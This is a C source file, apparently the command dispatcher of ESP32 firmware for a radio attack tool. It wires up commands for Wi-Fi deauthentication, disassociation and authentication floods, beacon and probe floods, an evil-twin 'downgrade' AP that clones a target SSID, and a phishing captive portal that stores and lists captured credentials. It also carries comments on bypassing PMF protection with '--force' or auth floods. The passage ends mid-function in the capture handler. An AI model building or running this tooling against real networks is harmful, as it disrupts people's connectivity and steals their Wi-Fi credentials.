/*
 * cli.c: 极简 fgets+dispatch REPL 实现 (彻底绕过 esp_console 栈溢出)
 *
 * 设计原则:
 *   1. 零额外任务: 直接在调用者任务 (cli_task) 中跑 REPL 循环
 *   2. 零重型依赖: 不用 esp_console / linenoise / uart_driver_install
 *      UART0 已由 IDF stdio 初始化 (fgets/fputs 直接用), 省 10+KB 栈
 *   3. 保留 argtable3: 各命令参数解析逻辑完全复用, 行为不变
 *   4. 栈可预测: 最深调用 = fgets + split + arg_parse + cmd_xxx
 *      (跑完 85 条命令实测栈低水位还剩 17236/20480 字节, 现按 8192 给)
 *
 * 输出约定 (与 test_commands.py 对齐):
 *   REPL 提示符: "rftool> "
 *   help 输出:   "Commands:\n  <name>  <help>\n..."
 */
#include "cli.h"
#include "wifi_attack.h"
#include "csi.h"
#include "ble_gatt.h"
#include "radio_common.h"
#include "rgb_led.h"
#include "wifi_db.h"
#include "http_server.h"
#include "phish.h"
#include "cap.h"
#include "hs.h"
#include "karma.h"
#include "frame_build.h"
#include "ble_scan.h"
#include "ble_cli.h"
#include "ble_adv.h"
#include "zbsniff.h"
#include "zbtx.h"
#include "ftm.h"
#include "config.h"     /* NVS 配置持久化 */
#include "logring.h"    /* 日志环形缓冲 */
#include "ota.h"        /* 双区 OTA */
#include "scenario.h"   /* /: 场景编排 + PMF 感知 */
#include "locate.h"     /* 信号定位 */
#include "event_bus.h"  /* 统一事件总线 */
#include "radio_arb.h"  /* 射频仲裁器: 唯一占用真值来源 */
#include "version.h"    /* RFTOOL_VERSION */

#include <stdio.h>
#include <stdlib.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <string.h>
#include <ctype.h>
#include "esp_timer.h"
#include "esp_log.h"
#include "esp_system.h"   /* esp_restart() */
#include "esp_heap_caps.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_check.h"
#include "argtable3/argtable3.h"
#include "esp_bt.h"   /* BLE 发射功率控制 esp_ble_tx_power_set() */



#define MAX_CMDLINE   256
#define MAX_ARGC      32

/* 全局开关. 在 cli_exec_line 里剥离, 不进入各命令的 argv. */
static bool g_json  = false;   /* --json: 结构化输出 */
static bool g_force = false;   /* --force: 跳过 PMF 等软性拦截 */
static bool g_yes   = false;   /* --yes / -y: 危险命令确认（由 CLI 层剥离） */

/* 流编号. 每条命令进出各打一行帧标记, 帧内的行按位置归属这一条命令.
 * 见 cli_exec_line() 里的说明. */
static uint32_t s_stream_id = 0;

/* 危险命令二次确认. 确认开关已由 cli_exec_line 统一剥离到 g_yes.
 * 早期版本在这里扫 argv 找 --yes, 但 argtable 会先把 --yes 判成未知参数,
 * 导致危险命令永远无法确认（实测 deauth --yes 报 invalid option）。 */
static bool confirm_dangerous(int argc, char **argv, const char *desc)
{
    (void)argc;
    if (g_yes) return true;
    /* 必须走 META: 以前打的是裸 WARN 文本, 调用方一行都收不到,
     * App 侧表现就是"设备无响应"。msg,need_confirm 让调用方自己决定
     * 是弹窗确认后再发一次, 还是直接放弃。 */
    printf("META,CLI,ERR,cmd,%s,msg,need_confirm,detail,add --yes: %s %s --yes\n",
           argv[0], argv[0], desc ? desc : "");
    fflush(stdout);
    return false;
}

/* 参数解析失败 -> 机器可读的 META 行.
 * arg_print_errors(stderr) 只到 stderr, 虽会进日志环形缓冲但不是 META 行,
 * 走 META 协议的调用方一行都收不到, 表现为"设备无响应", 该类故障的头号
 * 来源, 全部改走这里.
 * 输出 META,CLI,ERR,cmd,X,msg,arg_parse_failed,detail,Y: msg 是稳定机器码供
 * 调用方分支, detail 给人看; detail 内换行/逗号压成空格以保住 CSV 分隔. */
static void meta_arg_errors(struct arg_end *end, const char *cmd)
{
    char  *buf = NULL;
    size_t sz  = 0;
    FILE  *fp  = open_memstream(&buf, &sz);
    if (!fp) {
        printf("META,CLI,ERR,cmd,%s,msg,bad_option\n", cmd);
        fflush(stdout);
        return;
    }
    arg_print_errors(fp, end, cmd);
    fclose(fp);
    if (buf) {
        for (char *p = buf; *p; p++) {
            if (*p == '\r' || *p == '\n' || *p == ',') *p = ' ';
        }
        while (sz > 0 && buf[sz - 1] == ' ') buf[--sz] = '\0';
        printf("META,CLI,ERR,cmd,%s,msg,arg_parse_failed,detail,%s\n", cmd, buf);
        free(buf);
    }
    fflush(stdout);
}

/* 拆分 "cmd a b -c d" -> argv[0..argc-1], 返回 argc.
 * 支持简单引号 "a b" 作为单参数 (够用, 不做转义).
 * 修改输入缓冲区 (加 \0). */
static int split_args(char *line, char **argv, int max_argc)
{
    int argc = 0;
    char *p = line;
    while (*p && argc < max_argc) {
        /* 跳空白 */
        while (*p && isspace((unsigned char)*p)) p++;
        if (!*p) break;
        if (*p == '"') {
            /* 引号参数 */
            p++;
            argv[argc++] = p;
            while (*p && *p != '"') p++;
            if (*p == '"') *p++ = '\0';
        } else {
            argv[argc++] = p;
            while (*p && !isspace((unsigned char)*p)) p++;
            if (*p) *p++ = '\0';
        }
    }
    return argc;
}


typedef int (*cmd_func_t)(int argc, char **argv);

typedef struct {
    const char *name;
    const char *help;
    const char *hint;
    cmd_func_t  func;
    void      (*arg_reset)(void);
} cli_cmd_t;

static struct {
    arg_int_t *channel;
    arg_int_t *count;
    arg_int_t *dwell;
    arg_end_t *end;
} sniff_args;

static void sniff_arg_reset(void)
{
    if (sniff_args.channel) arg_freetable((void **)&sniff_args.channel, 4);
    sniff_args.channel = arg_int1(NULL, NULL, "<ch|auto>", "2.4G:1-14, 5G:36/40/44/48/52..144/149..177, or 'auto'");
    sniff_args.count   = arg_int0("n", "count", "<n>", "stop after N packets (0=forever)");
    sniff_args.dwell   = arg_int0("d", "dwell", "<ms>", "auto mode: ms per channel (default 1000)");
    sniff_args.end     = arg_end(3);
}

static int cmd_sniff(int argc, char **argv)
{
    /* 检测 auto 子命令: argv[1] == "auto" */
    if (argc >= 2 && strcmp(argv[1], "auto") == 0) {
        /* "auto" 不是合法 int，手动解析 [--dwell N] [-n N] [--policy wrl|psd] */
        uint32_t dwell = 1000;
        uint32_t cnt = 0;
        int i = 2;
        while (i < argc) {
            const char *a = argv[i];
            if ((strcmp(a, "--dwell") == 0 || strcmp(a, "-d") == 0) && i + 1 < argc) {
                dwell = (uint32_t)atoi(argv[i+1]);
                if (dwell < 50) dwell = 50;
                if (dwell > 60000) dwell = 60000;
                i += 2;
            } else if ((strcmp(a, "--count") == 0 || strcmp(a, "-n") == 0) && i + 1 < argc) {
                cnt = (uint32_t)atoi(argv[i+1]);
                i += 2;
            } else if (strcmp(a, "--policy") == 0 && i + 1 < argc) {
                const char *p = argv[i+1];
                if (strcmp(p, "psd") == 0)      wifi_attack_set_auto_policy(1);
                else if (strcmp(p, "wrl") == 0) wifi_attack_set_auto_policy(0);
                else {
                    printf("META,WIFI,ERR,msg,bad_policy (wrl|psd)\n");
                    fflush(stdout);
                    return 1;
                }
                i += 2;
            } else {
                printf("META,WIFI,ERR,msg,bad_option,%s\n", a);
                fflush(stdout);
                return 1;
            }
        }
        /* cnt 传给固件: 之前解析出来就被 (void) 丢掉, 敲了 -n 也不会到数停 */
        esp_err_t e = wifi_attack_sniff_auto_start(dwell, cnt);
        if (e != ESP_OK) {
            printf("META,WIFI,ERR,code,%d,msg,sniff_auto_start_failed\n", e);
            fflush(stdout);
            return 1;
        }
        return 0;
    }
    int nerrors = arg_parse(argc, argv, (void **)&sniff_args);
    if (nerrors) {
        meta_arg_errors(sniff_args.end, argv[0]);
        return 1;
    }
    int ch_raw = sniff_args.channel->ival[0];
    /* 粗范围: 2.4G 1-14, 5G 36-177; 具体合法信道由 wifi_attack_sniff_start 校验 */
    if (ch_raw < 1 || (ch_raw > 14 && ch_raw < 36) || ch_raw > 177) {
        printf("META,WIFI,ERR,msg,bad_channel (1-14 or 36-177 or 'auto')\n"); fflush(stdout); return 1;
    }
    uint8_t ch = (uint8_t)ch_raw;
    uint32_t cnt = sniff_args.count->count ? (uint32_t)sniff_args.count->ival[0] : 0;
    esp_err_t e = wifi_attack_sniff_start(ch, cnt);
    if (e != ESP_OK) {
        printf("META,WIFI,ERR,code,%d,msg,sniff_start_failed\n", e);
        fflush(stdout);
        return 1;
    }
    return 0;
}

static int cmd_stop(int argc, char **argv)
{
    (void)argc; (void)argv;
    /* stop_all: 同时停 sniff + inject + downgrade, 互斥状态机统一入口 */
    esp_err_t e = wifi_attack_stop_all();
    if (e == ESP_OK) {
        return 0;
    }
    printf("META,WIFI,ERR,msg,nothing_running\n");
    fflush(stdout);
    return 1;
}

static struct {
    arg_str_t *bssid;
    arg_str_t *station;
    arg_int_t *count;
    arg_int_t *reason;
    arg_int_t *interval;
    arg_end_t *end;
} deauth_args;

static void deauth_arg_reset(void)
{
    if (deauth_args.bssid) arg_freetable((void **)&deauth_args.bssid, 6);
    deauth_args.bssid    = arg_str1("b", "bssid", "<mac>",   "target AP MAC");
    deauth_args.station  = arg_str0("s", "station", "<mac>", "target STA MAC (omit=broadcast)");
    deauth_args.count    = arg_int0("n", "count", "<n>",    "frames (0=forever)");
    deauth_args.reason   = arg_int0("r", "reason", "<r>",   "reason code (default 7)");
    deauth_args.interval = arg_int0("i", "interval", "<ms>","interval ms (default 0=fastest)");
    deauth_args.end      = arg_end(6);
}

static int cmd_deauth(int argc, char **argv)
{
    if (!confirm_dangerous(argc, argv, "-b <bssid>")) return 1;
    int nerrors = arg_parse(argc, argv, (void **)&deauth_args);
    if (nerrors) {
        meta_arg_errors(deauth_args.end, argv[0]);
        return 1;
    }
    uint8_t b[6], s[6] = {0};
    if (!parse_mac(deauth_args.bssid->sval[0], b)) {
        printf("META,WIFI,ERR,msg,bad_bssid\n"); fflush(stdout); return 1;
    }
    /* PMF 感知. 分三种情况:
     *   目标不在库   -> 无法判断 PMF, 拒绝 (必须先扫或显式 --force)
     *   MFPR=1       -> 广播 deauth 无效, 拒绝并给出替代路径
     *   MFPR=0 / --force -> 放行
     * 早期只判 "库里有且 pmf=1", 结果库为空时会把 deauth 直接打出去
     * (实测复位后 dump 表为空, 定向 deauth 照发), 这是必须堵的洞. */
    if (!g_force) {
        char ms[18]; mac_to_str(b, ms);
        const ap_entry_t *ap = wifi_db_find_ap(b);
        if (!ap) {
            printf("META,WIFI,PMF,UNKNOWN,bssid,%s,reason,not_in_db,"
                   "advice,sniff first or add --force\n", ms);
            fflush(stdout);
            return 1;
        }
        if (ap->pmf) {
            printf("META,WIFI,PMF,BLOCKED,bssid,%s,reason,mfpr,"
                   "advice,use --force / scenario pmf / downgrade / eviltwin\n", ms);
            fflush(stdout);
            return 1;
        }
    }
    if (deauth_args.station->count) {
        if (!parse_mac(deauth_args.station->sval[0], s)) {
            printf("META,WIFI,ERR,msg,bad_station\n"); fflush(stdout); return 1;
        }
    }
    uint32_t cnt  = deauth_args.count->count ? (uint32_t)deauth_args.count->ival[0] : 0;
    uint16_t rsn  = deauth_args.reason->count ? (uint16_t)deauth_args.reason->ival[0] : 7;
    uint32_t intv = deauth_args.interval->count ? (uint32_t)deauth_args.interval->ival[0] : 0;
    esp_err_t e = wifi_attack_deauth_start(b, s, cnt, rsn, intv);
    if (e != ESP_OK) {
        printf("META,WIFI,ERR,code,%d,msg,deauth_start_failed\n", e); fflush(stdout); return 1;
    }
    return 0;
}

static struct {
    arg_str_t *prefix;
    arg_int_t *count;
    arg_int_t *interval;
    arg_int_t *channel;
    arg_end_t *end;
} beacon_args;

static void beacon_arg_reset(void)
{
    if (beacon_args.prefix) arg_freetable((void **)&beacon_args.prefix, 5);
    beacon_args.prefix   = arg_str1("p", "prefix", "<str>",   "SSID prefix");
    beacon_args.count    = arg_int0("n", "count", "<n>",     "count (0=forever)");
    beacon_args.interval = arg_int0("i", "interval", "<ms>", "interval ms (default 0=20ms)");
    beacon_args.channel  = arg_int0("c", "channel", "<ch>",   "channel (default: current)");
    beacon_args.end      = arg_end(4);
}

static int cmd_beaconflood(int argc, char **argv)
{
    if (!confirm_dangerous(argc, argv, "-p <prefix>")) return 1;
    int nerrors = arg_parse(argc, argv, (void **)&beacon_args);
    if (nerrors) { meta_arg_errors(beacon_args.end, argv[0]); return 1; }
    uint32_t cnt  = beacon_args.count->count ? (uint32_t)beacon_args.count->ival[0] : 0;
    uint32_t intv = beacon_args.interval->count ? (uint32_t)beacon_args.interval->ival[0] : 0;
    uint8_t ch = beacon_args.channel->count ? (uint8_t)beacon_args.channel->ival[0] : 0;
    /* 空前缀在这里挡回去, 别混进 start_failed: 那是"起不来", 这是"参数不对",
     * 调用方要靠 msg 区分: 前者要排查设备, 后者改命令就行. */
    if (!beacon_args.prefix->sval[0] || !beacon_args.prefix->sval[0][0]) {
        printf("META,WIFI,ERR,msg,empty_prefix\n"); fflush(stdout); return 1;
    }
    esp_err_t e = wifi_attack_beacon_flood_start(beacon_args.prefix->sval[0], cnt, intv, ch);
    if (e != ESP_OK) {
        printf("META,WIFI,ERR,code,%d,msg,beacon_start_failed\n", e); fflush(stdout); return 1;
    }
    return 0;
}

static struct {
    arg_int_t *count;
    arg_int_t *interval;
    arg_end_t *end;
} probe_args;

static void probe_arg_reset(void)
{
    if (probe_args.count) arg_freetable((void **)&probe_args.count, 3);
    probe_args.count    = arg_int0("n", "count", "<n>",     "count (0=forever)");
    probe_args.interval = arg_int0("i", "interval", "<ms>", "interval ms (default 0=fastest)");
    probe_args.end      = arg_end(2);
}

static int cmd_probeflood(int argc, char **argv)
{
    if (!confirm_dangerous(argc, argv, "")) return 1;
    int nerrors = arg_parse(argc, argv, (void **)&probe_args);
    if (nerrors) { meta_arg_errors(probe_args.end, argv[0]); return 1; }
    uint32_t cnt  = probe_args.count->count ? (uint32_t)probe_args.count->ival[0] : 0;
    uint32_t intv = probe_args.interval->count ? (uint32_t)probe_args.interval->ival[0] : 0;
    esp_err_t e = wifi_attack_probe_flood_start(cnt, intv);
    if (e != ESP_OK) {
        printf("META,WIFI,ERR,code,%d,msg,probe_start_failed\n", e); fflush(stdout); return 1;
    }
    return 0;
}

/* flood: 对目标 AP 持续发送指定类型管理帧 (deauth/disassoc/auth).
 *   - auth 不是被保护管理帧, PMF 也照收; 每帧随机源 MAC 逼迫 AP 反复分配关联态,
 *     是真正能压垮脆弱 AP 的向量, 因此 auth 模式跳过 PMF 拦截.
 *   - deauth/disassoc 对 PMF AP 无效, 沿用与 deauth 相同的 PMF 感知 (MFPR=1 拦截,
 *     除非 --force). */
static struct {
    arg_str_t *bssid;
    arg_str_t *type;
    arg_str_t *station;
    arg_int_t *count;
    arg_int_t *interval;
    arg_end_t *end;
} flood_args;

static void flood_arg_reset(void)
{
    if (flood_args.bssid) arg_freetable((void **)&flood_args.bssid, 5);
    flood_args.bssid    = arg_str1("b", "bssid", "<mac>",   "target AP MAC");
    flood_args.type     = arg_str0("t", "type", "<deauth|disassoc|auth>", "frame type (default deauth)");
    flood_args.station  = arg_str0("s", "station", "<mac>", "target STA (omit=broadcast)");
    flood_args.count    = arg_int0("n", "count", "<n>",    "frames (0=forever)");
    flood_args.interval = arg_int0("i", "interval", "<ms>", "interval ms (default 0=fastest)");
    flood_args.end      = arg_end(6);
}

static int cmd_flood(int argc, char **argv)
{
    if (!confirm_dangerous(argc, argv, "-b <bssid>")) return 1;
    int nerrors = arg_parse(argc, argv, (void **)&flood_args);
    if (nerrors) { meta_arg_errors(flood_args.end, argv[0]); return 1; }

    const char *ts = flood_args.type->count ? flood_args.type->sval[0] : "deauth";
    int ftype;
    if (strcmp(ts, "auth") == 0)         ftype = WIFI_FLOOD_AUTH;
    else if (strcmp(ts, "disassoc") == 0) ftype = WIFI_FLOOD_DISASSOC;
    else if (strcmp(ts, "deauth") == 0)   ftype = WIFI_FLOOD_DEAUTH;
    else {
        printf("META,WIFI,ERR,msg,bad_type (want deauth|disassoc|auth)\n"); fflush(stdout); return 1;
    }

    uint8_t b[6], s[6] = {0};
    if (!parse_mac(flood_args.bssid->sval[0], b)) {
        printf("META,WIFI,ERR,msg,bad_bssid\n"); fflush(stdout); return 1;
    }

    /* PMF 拦截只针对被保护的管理帧 (deauth/disassoc); auth 不受 PMF 影响, 跳过. */
    if (ftype != WIFI_FLOOD_AUTH && !g_force) {
        char ms[18]; mac_to_str(b, ms);
        const ap_entry_t *ap = wifi_db_find_ap(b);
        if (!ap) {
            printf("META,WIFI,PMF,UNKNOWN,bssid,%s,reason,not_in_db,"
                   "advice,sniff first or add --force\n", ms);
            fflush(stdout); return 1;
        }
        if (ap->pmf) {
            printf("META,WIFI,PMF,BLOCKED,bssid,%s,reason,mfpr,"
                   "advice,use --force or switch to -t auth (auth is not PMF-protected)\n", ms);
            fflush(stdout); return 1;
        }
    }

    if (flood_args.station->count) {
        if (!parse_mac(flood_args.station->sval[0], s)) {
            printf("META,WIFI,ERR,msg,bad_station\n"); fflush(stdout); return 1;
        }
    }
    uint32_t cnt  = flood_args.count->count ? (uint32_t)flood_args.count->ival[0] : 0;
    uint32_t intv = flood_args.interval->count ? (uint32_t)flood_args.interval->ival[0] : 0;
    esp_err_t e = wifi_attack_flood_start(b, s, ftype, cnt, intv);
    if (e != ESP_OK) {
        printf("META,WIFI,ERR,code,%d,msg,flood_start_failed\n", e); fflush(stdout); return 1;
    }
    return 0;
}


static struct {
    arg_str_t *subcmd;
    arg_str_t *ssid;
    arg_str_t *pass;
    arg_end_t *end;
} http_args;

static int radio_res_parse(const char *s)
{
    if (strcmp(s, "promisc") == 0) return RES_RX_PROMISC;
    if (strcmp(s, "inject")  == 0) return RES_TX_INJECT;
    if (strcmp(s, "softap")  == 0) return RES_SOFTAP;
    if (strcmp(s, "154")     == 0) return RES_15_4;
    if (strcmp(s, "ble")     == 0) return RES_BLE_CENTRAL;
    return -1;
}

/* radio [status] | radio log [n] | radio test <a> <b> */
static int cmd_radio(int argc, char **argv)
{
    const char *sub = argc > 1 ? argv[1] : "status";

    if (strcmp(sub, "status") == 0) {
        uint32_t held = radio_held_mask();
        printf("META,RADIO,STATUS,owner,%s,held,%s,cases,%u,cap,%d\n",
               radio_owner(), radio_res_str(held),
               (unsigned)radio_case_total(), radio_case_capacity());
        fflush(stdout);
        return 0;
    }

    if (strcmp(sub, "log") == 0) {
        int n = argc > 2 ? atoi(argv[2]) : 10;
        if (n <= 0) { printf("META,RADIO,ERR,msg,bad_count\n"); fflush(stdout); return 1; }
        if (radio_case_dump(n) == 0) {
            printf("META,RADIO,LOG,empty,1\n");
            fflush(stdout);
        }
        return 0;
    }

    if (strcmp(sub, "test") == 0) {
        if (argc < 4) { printf("META,RADIO,ERR,msg,need_two_res\n"); fflush(stdout); return 1; }
        int a = radio_res_parse(argv[2]);
        int b = radio_res_parse(argv[3]);
        if (a < 0 || b < 0) {
            printf("META,RADIO,ERR,msg,bad_res,want,promisc|inject|softap|154|ble\n");
            fflush(stdout);
            return 1;
        }
        const char *why = radio_conflict_reason((radio_res_t)a, (radio_res_t)b);
        printf("META,RADIO,TEST,a,%s,b,%s,conflict,%d,why,%s\n",
               argv[2], argv[3], why ? 1 : 0, why ? why : "-");
        fflush(stdout);
        return 0;
    }

    printf("META,RADIO,ERR,msg,bad_subcmd,want,status|log|test\n");
    fflush(stdout);
    return 1;
}

static void http_arg_reset(void)
{
    if (http_args.subcmd) arg_freetable((void **)&http_args.subcmd, 4);
    http_args.subcmd = arg_str1(NULL, NULL, "<start|stop|status>", "subcommand");
    http_args.ssid   = arg_str0(NULL, "ssid", "<str>", "AP SSID (start only)");
    http_args.pass   = arg_str0(NULL, "pass", "<str>", "AP password (start only, min 8)");
    http_args.end    = arg_end(4);
}

static int cmd_http(int argc, char **argv)
{
    int nerrors = arg_parse(argc, argv, (void **)&http_args);
    if (nerrors) { meta_arg_errors(http_args.end, argv[0]); return 1; }
    const char *sub = http_args.subcmd->sval[0];
    if (strcmp(sub, "start") == 0) {
        const char *ssid = (http_args.ssid->count) ? http_args.ssid->sval[0] : NULL;
        const char *pw   = (http_args.pass->count) ? http_args.pass->sval[0] : NULL;
        esp_err_t e = http_server_start(ssid, pw);
        if (e != ESP_OK) { printf("META,WIFI,ERR,code,%d,msg,http_start_failed\n", e); fflush(stdout); return 1; }

        return 0;
    } else if (strcmp(sub, "stop") == 0) {
        esp_err_t e = http_server_stop();
        if (e != ESP_OK) { printf("META,WIFI,ERR,code,%d,msg,http_stop_failed\n", e); fflush(stdout); return 1; }

        return 0;
    } else if (strcmp(sub, "status") == 0) {
        http_server_status();
        return 0;
    }
    printf("META,WIFI,ERR,msg,bad_subcmd (start|stop|status)\n"); fflush(stdout);

    return 1;
}

static struct {
    arg_str_t *ssid;
    arg_str_t *pass;
    arg_end_t *end;
} downgrade_args;

static void downgrade_arg_reset(void)
{
    if (downgrade_args.ssid) arg_freetable((void **)&downgrade_args.ssid, 3);
    downgrade_args.ssid = arg_str1(NULL, NULL, "<ssid>", "target network SSID to clone");
    downgrade_args.pass = arg_str0(NULL, "pass", "<str>", "fake AP password (default rftool1234)");
    downgrade_args.end  = arg_end(3);
}

static int cmd_downgrade(int argc, char **argv)
{
    /* list 是只读查询, 不进 confirm: 列一下候选, 不启动任何东西 */
    if (argc >= 2 && strcmp(argv[1], "list") == 0) {
        int n = 0, cnt = 0;
        const ap_entry_t *aps = wifi_db_get_aps(&n);
        for (int i = 0; i < n; i++) {
            const ap_entry_t *e = &aps[i];
            if (!e->transition) continue;
            char bs[18];
            mac_to_str(e->bssid, bs);
            printf("META,DOWNGRADE,CAND,bssid,%s,ssid,%s,ch,%u,rssi,%d\n",
                   bs, e->ssid, (unsigned)e->channel, (int)e->rssi);
            cnt++;
        }
        printf("META,DOWNGRADE,LIST,count,%d,total,%d\n", cnt, n);
        fflush(stdout);
        return 0;
    }
    if (!confirm_dangerous(argc, argv, "<ssid>")) return 1;
    int nerrors = arg_parse(argc, argv, (void **)&downgrade_args);
    if (nerrors) { meta_arg_errors(downgrade_args.end, argv[0]); return 1; }
    const char *ssid = downgrade_args.ssid->sval[0];
    const char *pass = (downgrade_args.pass->count) ? downgrade_args.pass->sval[0] : "rftool1234";
    esp_err_t e = wifi_attack_downgrade_start(ssid, pass);
    if (e != ESP_OK) {
        printf("META,WIFI,ERR,code,%d,msg,downgrade_start_failed\n", e); fflush(stdout); return 1;
    }
    return 0;
}

static struct {
    arg_str_t *format;
    arg_end_t *end;
} export_args;

static void export_arg_reset(void)
{
    if (export_args.format) arg_freetable((void **)&export_args.format, 2);
    export_args.format = arg_str1(NULL, NULL, "<csv|json>", "export format");
    export_args.end    = arg_end(2);
}

static int cmd_export(int argc, char **argv)
{
    int nerrors = arg_parse(argc, argv, (void **)&export_args);
    if (nerrors) { meta_arg_errors(export_args.end, argv[0]); return 1; }
    const char *fmt = export_args.format->sval[0];
    rgb_status_t prev = rgb_led_get_status();
    rgb_led_set_status(RGB_EXPORT);
    if (strcmp(fmt, "csv") == 0) {
        wifi_db_export_csv();
    } else if (strcmp(fmt, "json") == 0) {
        wifi_db_export_json();
    } else {
        rgb_led_set_status(prev);
        printf("META,WIFI,ERR,msg,bad_format (csv or json)\n"); fflush(stdout); return 1;
    }
    rgb_led_set_status(prev);
    return 0;
}

static struct {
    arg_str_t *what;
    arg_end_t *end;
} dump_args;

static void dump_arg_reset(void)
{
    if (dump_args.what) arg_freetable((void **)&dump_args.what, 2);
    dump_args.what = arg_str1(NULL, NULL, "<aps|clients|eapols|all|clear>", "what to dump");
    dump_args.end  = arg_end(2);
}

static int cmd_dump(int argc, char **argv)
{
    int nerrors = arg_parse(argc, argv, (void **)&dump_args);
    if (nerrors) { meta_arg_errors(dump_args.end, argv[0]); return 1; }
    const char *w = dump_args.what->sval[0];
    rgb_status_t prev = rgb_led_get_status();
    rgb_led_set_status(RGB_DUMP);
    if (strcmp(w, "clear") == 0) {
        /* 显式清空设备端追踪表. sniff 起始不再自动清表 (App 走
         * sniff -> stop -> dump, 自动清会把刚采到的数据抹掉),
         * 因此把清空动作独立出来交给这个子命令. */
        wifi_db_clear();
        rgb_led_set_status(prev);
        printf("META,WIFI,DUMP,CLEARED,aps,0,clients,0,eapols,0\n");
        fflush(stdout);
        return 0;
    }
    if (strcmp(w, "aps") == 0 || strcmp(w, "all") == 0) wifi_db_dump_aps();
    if (strcmp(w, "clients") == 0 || strcmp(w, "all") == 0) wifi_db_dump_clients();
    if (strcmp(w, "eapols") == 0 || strcmp(w, "all") == 0) wifi_db_dump_eapols();
    if (strcmp(w, "aps") && strcmp(w, "clients") && strcmp(w, "eapols") && strcmp(w, "all")) {
        rgb_led_set_status(prev);
        printf("META,WIFI,ERR,msg,bad_target (aps|clients|eapols|all|clear)\n"); fflush(stdout); return 1;
    }
    rgb_led_set_status(prev);
    return 0;
}

static int cmd_status(int argc, char **argv)
{
    (void)argc; (void)argv;
    if (g_json) {
        int sv = wifi_atk_state_val();
        const char *st = (sv == 1) ? "SNIFF" : (sv == 2) ? "INJECT" :
                         (sv == 3) ? "DOWNGRADE" : "IDLE";
        printf("{\"ok\":true,\"state\":\"%s\",\"channel\":%u,\"auto_ch\":%s,"
               "\"sniff_total\":%u,\"inject_total\":%u,\"aps\":%d,\"clients\":%d,"
               "\"eapols\":%d,\"tasks\":%u,\"locate\":%s,\"scenario\":\"%s\"}\n",
               st, (unsigned)wifi_atk_channel(), wifi_atk_auto_ch() ? "true" : "false",
               (unsigned)wifi_atk_sniff_total(), (unsigned)wifi_atk_inject_total(),
               wifi_db_ap_count(), wifi_db_client_count(), wifi_db_eapol_count(),
               (unsigned)uxTaskGetNumberOfTasks(),
               locate_running() ? "true" : "false", scenario_kind_str());
        fflush(stdout);
        return 0;
    }
    wifi_attack_status();
    return 0;
}

static int cmd_version(int argc, char **argv)
{
    (void)argc; (void)argv;
    if (g_json) {
        printf("{\"ok\":true,\"fw\":\"RFTOOL-C5\",\"version\":\"" RFTOOL_VERSION "\"}\r\n");
        fflush(stdout);
        return 0;
    }
    printf("RFTOOL-C5 v" RFTOOL_VERSION "\r\n");
    return 0;
}

/* phish (钓鱼门户 / Captive Portal) */
static int cmd_phish(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage:\n"
               "  phish start <ssid> [pass]   start captive portal AP\n"
               "  phish stop                  stop portal\n"
               "  phish status                show state\n"
               "  phish stations              list clients joined the portal AP\n"
               "  phish creds [clear]         list/clear captured credentials\n"
               "  phish html size|clear       custom portal page info\n"
               "  phish html begin <n>|end    upload custom page (BLE FILE frames)\n");
        return 1;
    }
    const char *sub = argv[1];

    if (strcmp(sub, "start") == 0) {
        if (argc < 3) { printf("META,PHISH,ERR,msg,need_ssid\n"); fflush(stdout); return 1; }
        const char *ssid = argv[2];
        const char *pass = (argc >= 4) ? argv[3] : NULL;
        return phish_start(ssid, pass) == ESP_OK ? 0 : 1;
    }
    if (strcmp(sub, "stop") == 0) {
        if (phish_stop() != ESP_OK) {
            printf("META,PHISH,ERR,msg,not_running\n"); fflush(stdout);
            return 1;
        }
        return 0;
    }
    if (strcmp(sub, "status") == 0) { phish_status(); return 0; }
    if (strcmp(sub, "stations") == 0 || strcmp(sub, "sta") == 0) { phish_stations(); return 0; }

    if (strcmp(sub, "creds") == 0) {
        if (argc >= 3 && strcmp(argv[2], "clear") == 0) {
            phish_creds_clear();
            printf("META,PHISH,CREDS,cleared,1\n"); fflush(stdout);
            return 0;
        }
        phish_creds_dump();
        return 0;
    }

    if (strcmp(sub, "html") == 0) {
        if (argc < 3) { printf("META,PHISH,ERR,msg,need_html_subcmd\n"); fflush(stdout); return 1; }
        const char *h = argv[2];
        if (strcmp(h, "size") == 0) {
            printf("META,PHISH,HTML,size,%d,max,%d\n", phish_html_size(), PHISH_HTML_MAX);
            fflush(stdout);
            return 0;
        }
        if (strcmp(h, "clear") == 0) {
            phish_html_clear();
            printf("META,PHISH,HTML,cleared,1\n"); fflush(stdout);
            return 0;
        }
        if (strcmp(h, "begin") == 0) {
            if (argc < 4) { printf("META,PHISH,ERR,msg,need_size\n"); fflush(stdout); return 1; }
            int total = atoi(argv[3]);
            if (phish_html_begin(total) != 0) {
                printf("META,PHISH,ERR,msg,begin_failed,max,%d\n", PHISH_HTML_MAX);
                fflush(stdout);
                return 1;
            }
            printf("META,PHISH,HTML,BEGIN,size,%d\n", total); fflush(stdout);
            return 0;
        }
        if (strcmp(h, "end") == 0) {
            esp_err_t e = phish_html_end();
            if (e != ESP_OK) {
                printf("META,PHISH,ERR,msg,commit_failed,code,%d\n", (int)e); fflush(stdout);
                return 1;
            }
            printf("META,PHISH,HTML,END,size,%d\n", phish_html_size()); fflush(stdout);
            return 0;
        }
        printf("META,PHISH,ERR,msg,bad_html_subcmd\n"); fflush(stdout);
        return 1;
    }

    printf("META,PHISH,ERR,msg,bad_subcmd (start|stop|status|creds|html)\n");
    fflush(stdout);
    return 1;
}

/* cap (原始帧落盘 / 分段拉取) */
static int cmd_cap(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage:\n"
               "  cap start [key]        start raw-frame capture to flash (key = 只落关键帧)\n"
               "  cap stop               stop capture\n"
               "  cap clear              drop captured data\n"
               "  cap info               show counters\n"
               "  cap keys               list key frames (EAPOL/PMKID/Deauth) index\n"
               "  cap read <off> <len>   pull pcap bytes (binary CHUNK frames)\n"
               "  cap hex <off> <len>    hex dump pcap bytes (串口自检, 最多 1KB)\n"
               "  cap hdr                send 24-byte pcap global header\n");
        return 1;
    }
    const char *sub = argv[1];

    if (strcmp(sub, "start") == 0) {
        bool key = (argc >= 3 && (strcmp(argv[2], "key") == 0 || strcmp(argv[2], "keyonly") == 0));
        esp_err_t e = cap_start(key);
        if (e != ESP_OK) {
            printf("META,CAP,ERR,msg,start_failed,code,%d\n", (int)e);
            fflush(stdout);
            return 1;
        }
        printf("META,CAP,START,ok,1,keyonly,%d,cap,%u\n", key ? 1 : 0, (unsigned)cap_capacity());
